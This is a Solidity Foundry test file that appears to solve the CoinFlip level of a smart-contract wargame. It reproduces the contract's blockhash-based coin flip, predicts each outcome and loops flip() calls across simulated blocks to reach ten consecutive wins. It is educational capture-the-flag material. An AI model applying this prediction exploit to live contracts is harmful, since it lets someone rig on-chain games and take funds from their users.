// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "src/03/CoinFlip.sol";

contract CoinFlipTest is Test {

    CoinFlip public level;

    address instance = vm.addr(0x1); 
    address hacker = vm.addr(0x2); 
    
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint8 consecutiveWinsHacked = 10;

    function setUp() public {

        vm.prank(instance);
        level = new CoinFlip();
    
    }

    /////////////////////////////////////////////////////
    // Copy the pseudo-random function from the contract
    ////////////////////////////////////////////////////
    function generateSide() internal view returns (bool) {

            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 coinFlip = blockValue / FACTOR;
            bool side = coinFlip == 1 ? true : false;
            return side;

     }

    function testCoinFlipHack() public {

        vm.startPrank(hacker);
        assertEq(level.consecutiveWins(), 0);
    
        while (level.consecutiveWins() < consecutiveWinsHacked) {

            /////////////////////
            // "Flip" the coin
            ////////////////////
            level.flip(generateSide());

            ////////////////////////////
            // Simulate the next block
            ////////////////////////////
            vm.roll(block.number + 1);

        }

        assertEq(level.consecutiveWins(), consecutiveWinsHacked);
        vm.stopPrank();

      }
}